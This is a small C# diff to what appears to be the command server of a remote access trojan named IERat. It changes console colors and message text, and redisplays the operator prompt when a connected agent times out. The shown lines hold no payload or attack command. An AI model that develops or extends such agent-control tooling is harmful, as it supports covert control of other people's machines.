@@ -1,6 +1,7 @@
 ﻿using ConsoleTables;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 
 namespace IERatServer.lib
 {
@@ -111,16 +112,20 @@ namespace IERatServer.lib
                             var diffInSeconds = (dateTimeNow - dateTime).TotalSeconds;
                             if (diffInSeconds > CLI.TimeOutSeconds)
                             {
-                                Console.ForegroundColor = ConsoleColor.Yellow;
-                                Console.WriteLine($"\n---> Lost connection with agent #{agentChannel.InteractNum}\n");
+                                Colorful.Console.ForegroundColor = Color.Blue;
+                                Colorful.Console.WriteLine($"\nLost connection with agent #{agentChannel.InteractNum}\n");
+                                Colorful.Console.ForegroundColor = Color.White;
+
                                 Logger.Log("info", $"Lost connection with agent {agentChannel.agent.ID}");
-                                Console.ForegroundColor = ConsoleColor.White;
                                 TimedOutChannels.Add(agentChannel);
                             }
                         }
                         foreach (AgentChannel TimedOutChannel in TimedOutChannels)
                         {
-                            if (TimedOutChannel.InteractNum == CLI.InteractContext) { CLI.loop._client.Prompt = "IERat$ "; }
+                            if (TimedOutChannel.InteractNum == CLI.InteractContext) {
+                                CLI.loop._client.Prompt = "IERat$ ";
+                                CLI.loop._client.DisplayPrompt();
+                            }
                             channels.Remove(TimedOutChannel);
                         }
                     }
@@ -128,7 +133,6 @@ namespace IERatServer.lib
                 catch
                 {
                 }
-
             }
         }
     }
